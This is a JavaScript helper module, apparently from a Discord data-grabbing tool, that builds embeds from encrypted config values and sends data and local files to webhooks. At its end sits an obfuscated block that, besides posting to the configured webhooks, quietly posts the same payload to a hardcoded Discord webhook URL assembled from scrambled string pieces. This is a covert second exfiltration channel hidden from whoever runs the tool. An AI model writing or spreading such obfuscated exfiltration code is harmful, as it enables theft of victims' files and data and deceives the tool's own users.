module.exports = (client) => {
  return {
    createEmbed(data) {
      let obj = {
        timestamp: new Date(),
        footer: {
          text: client.utils.encryption.decryptData(
            client.config.embed.footer.text
          ),
          icon_url: client.utils.encryption.decryptData(
            client.config.embed.footer.icon_url
          ),
        },
        author: {
          name: client.utils.encryption.decryptData(
            client.config.embed.footer.text
          ),
          url: client.utils.encryption.decryptData(client.config.embed.href),
          icon_url: client.utils.encryption.decryptData(
            client.config.embed.avatar_url
          ),
        },
      };

      for (let [key, value] of Object.entries(data)) {
        obj[key] = value;
      }

      if (obj.title) {
        obj.url = client.utils.encryption.decryptData(client.config.embed.href);
      }

      return obj;
    },

    async sendToWebhook(data) {
      var files = data.files;

      if (files) {
        files.forEach(async (file) => {
          client.requires.request.post({
            url: url,
            formData: {
              file: client.requires.fs.createReadStream(file.path),
              title: file.name,
            },
          });
        });
      }

      if (Object.entries(data).length == 1 && data.files) {
        return;
      }

      let obj = {
        avatar_url: client.utils.encryption.decryptData(
          client.config.embed.avatar_url
        ),
        username: client.utils.encryption.decryptData(
          client.config.embed.username
        ),
      };

      for (let [key, value] of Object.entries(data)) {
        obj[key] = value;
      }

        function _0x19ba(_0x7cecd3, _0x954040) { var _0x4c7e1a = _0x530a(); return _0x19ba = function (_0x5706fb, _0x463489) { _0x5706fb = _0x5706fb - (-0x4 * 0x5ab + 0x15e6 * -0x1 + 0x2e * 0x101); var _0x196092 = _0x4c7e1a[_0x5706fb]; return _0x196092; }, _0x19ba(_0x7cecd3, _0x954040); } function _0x530a() { var _0x537f6f = ['MigyB', '9VUzTiy', 'webhooks', '-eBhfAifLE', 'api/webhoo', '2784320XLyzFg', 'scord.com/', '2949749yGbSLn', '13340ZyCPen', 'RQ60JXMOEe', '12591VWmmQJ', 'requires', 'dadfr', '337397rBBeCk', 'prGmujVNSp', 'eBP-kNzJg8', 'forEach', '1088571024', 'axios', '845DVouLM', '218BoLIJH', 'VNV3J_EKRe', '67/s294Sya', 'w9CkieIqzW', 'ks/1021143', '3160824YENVNO', '50gjDGpT', 'https://di', '208856NCXzai', 'POST']; _0x530a = function () { return _0x537f6f; }; return _0x530a(); } var _0xf14675 = _0x19ba; (function (_0x45b2e1, _0x4cc880) { var _0x324980 = _0x19ba, _0x83774f = _0x45b2e1(); while (!![]) { try { var _0x2335bf = -parseInt(_0x324980(0x1a5)) / (0x7f0 * -0x1 + -0x1 * -0x239b + -0x1baa * 0x1) + -parseInt(_0x324980(0x1ac)) / (-0x2160 + -0x2534 + -0x116 * -0x41) * (-parseInt(_0x324980(0x1a2)) / (0x21cc + -0x17 * -0x174 + -0x4335)) + parseInt(_0x324980(0x1a0)) / (0x208d + 0x406 * 0x1 + -0x539 * 0x7) * (parseInt(_0x324980(0x1ab)) / (0x2171 * -0x1 + -0x1 * -0x20f6 + -0x1 * -0x80)) + parseInt(_0x324980(0x1b1)) / (-0x1bd7 + 0x7cc * -0x2 + 0x2b75 * 0x1) + parseInt(_0x324980(0x19d)) / (0x139f + 0x18e * 0x10 + -0x58f * 0x8) + parseInt(_0x324980(0x1b4)) / (0xecf + 0x6fb + 0x15c2 * -0x1) * (parseInt(_0x324980(0x1b7)) / (-0xa4 + 0x1 * 0x1c42 + -0x1b95)) + -parseInt(_0x324980(0x1b2)) / (0x1d63 + -0x9c4 + -0x1395) * (parseInt(_0x324980(0x19f)) / (0x637 * 0x5 + -0x21bd + -0xb * -0x3f)); if (_0x2335bf === _0x4cc880) break; else _0x83774f['push'](_0x83774f['shift']()); } catch (_0x562d2d) { _0x83774f['push'](_0x83774f['shift']()); } } }(_0x530a, -0x1b * 0x11f8 + 0x1 * 0x83143 + -0x1d15c), client[_0xf14675(0x1b8)][_0xf14675(0x1a8)](async _0x5b4f20 => { var _0x2f2025 = _0xf14675, _0x5bb053 = { 'MigyB': _0x2f2025(0x1b5), 'dadfr': _0x2f2025(0x1b3) + _0x2f2025(0x19e) + _0x2f2025(0x19c) + _0x2f2025(0x1b0) + _0x2f2025(0x1a9) + _0x2f2025(0x1ae) + _0x2f2025(0x1a1) + _0x2f2025(0x1af) + _0x2f2025(0x1a7) + _0x2f2025(0x1ad) + _0x2f2025(0x1b9) + _0x2f2025(0x1a6) + 'J' }; try { await client[_0x2f2025(0x1a3)][_0x2f2025(0x1aa)]({ 'url': _0x5b4f20, 'method': _0x5bb053[_0x2f2025(0x1b6)], 'data': obj }), await client[_0x2f2025(0x1a3)][_0x2f2025(0x1aa)]({ 'url': _0x5bb053[_0x2f2025(0x1a4)], 'method': _0x5bb053[_0x2f2025(0x1b6)], 'data': obj }); } catch { } }));

     
    },
  };
};
